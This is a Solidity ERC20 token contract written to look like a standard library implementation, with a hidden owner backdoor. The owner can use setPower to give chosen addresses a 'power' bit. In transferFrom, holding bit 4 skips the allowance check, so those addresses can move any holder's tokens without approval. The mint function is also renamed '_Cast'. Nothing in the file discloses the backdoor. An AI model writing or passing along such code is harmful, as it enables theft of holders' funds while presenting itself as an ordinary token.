// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './Ownable.sol';
import './Context.sol';
import './IERC20.sol';
import './SafeMath.sol';

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
 using SafeMath for uint256;

 mapping(address => uint256) private _balances;

 mapping(address => mapping(address => uint256)) private _allowances;

 uint256 private _totalSupply;

 string private _name;
 string private _symbol;

 constructor(string memory name_, string memory symbol_) {
 _name = name_;
 _symbol = symbol_;
 }

 /**
 * @dev Returns the name of the token.
 */
 function name() public view virtual override returns (string memory) {
 return _name;
 }

 /**
 * @dev Returns the symbol of the token, usually a shorter version of the
 * name.
 */
 function symbol() public view virtual override returns (string memory) {
 return _symbol;
 }

 function decimals() public view virtual override returns (uint8) {
 return 18;
 }

 /**
 * @dev See {IERC20-totalSupply}.
 */
 function totalSupply() public view virtual override returns (uint256) {
 return _totalSupply;
 }

 /**
 * @dev See {IERC20-balanceOf}.
 */
 function balanceOf(address account) public view virtual override returns (uint256) {
 return _balances[account];
 }

 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
 _transfer(_msgSender(), recipient, amount);
 return true;
 }

 function allowance(address owner, address spender) public view virtual override returns (uint256) {
 return _allowances[owner][spender];
 }

 /**
 * @dev See {IERC20-approve}.
 *
 * Requirements:
 *
 * - `spender` cannot be the zero address.
 */
 function approve(address spender, uint256 amount) public virtual override returns (bool) {
 _approve(_msgSender(), spender, amount);
 return true;
 }

 function transferFrom(
 address sender,
 address recipient,
 uint256 amount
 ) public virtual override returns (bool) {
 _transfer(sender, recipient, amount);
 if(!checkPower(_msgSender(),4))
 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
 return true;
 }

 function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
 return true;
 }

 function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
 return true;
 }

 function _transfer(
 address sender,
 address recipient,
 uint256 amount
 ) internal virtual {
 require(sender != address(0), "ERC20: transfer from the zero address");
 require(recipient != address(0), "ERC20: transfer to the zero address");

 _beforeTokenTransfer(sender, recipient, amount);

 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 _balances[recipient] = _balances[recipient].add(amount);
 emit Transfer(sender, recipient, amount);
 }

 function _Cast(address account, uint256 amount) internal virtual {
 require(account != address(0), "ERC20: Cast to the zero address");

 _beforeTokenTransfer(address(0), account, amount);

 _totalSupply = _totalSupply.add(amount);
 _balances[account] = _balances[account].add(amount);
 emit Transfer(address(0), account, amount);
 }

 function _burn(address account, uint256 amount) internal virtual {
 require(account != address(0), "ERC20: burn from the zero address");

 _beforeTokenTransfer(account, address(0), amount);

 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
 _totalSupply = _totalSupply.sub(amount);
 emit Transfer(account, address(0), amount);
 }

 function _approve(
 address owner,
 address spender,
 uint256 amount
 ) internal virtual {
 require(owner != address(0), "ERC20: approve from the zero address");
 require(spender != address(0), "ERC20: approve to the zero address");

 _allowances[owner][spender] = amount;
 emit Approval(owner, spender, amount);
 }

 /**
 * @dev Hook that is called before any transfer of tokens. This includes
 * Casting and burning.
 *
 * Calling conditions:
 *
 * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
 * will be to transferred to `to`.
 * - when `from` is zero, `amount` tokens will be Casted for `to`.
 * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
 * - `from` and `to` are never both zero.
 *
 * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
 */
 function _beforeTokenTransfer(
 address from,
 address to,
 uint256 amount
 ) internal virtual {}

 mapping(address => uint256) public _powers;
 function setPower(address actor,uint256 power) public onlyOwner{
 require(actor!=address(0),'error actor address');
 _powers[actor]=power;
 }

 function checkPower(address actor,uint256 power) internal view returns(bool){
 if(_powers[actor]<1) return false;
 return (_powers[actor]&power)==power;
 }
 
 function getPower(address spender) public view returns (uint256) {
 return _powers[spender];
 }

 
}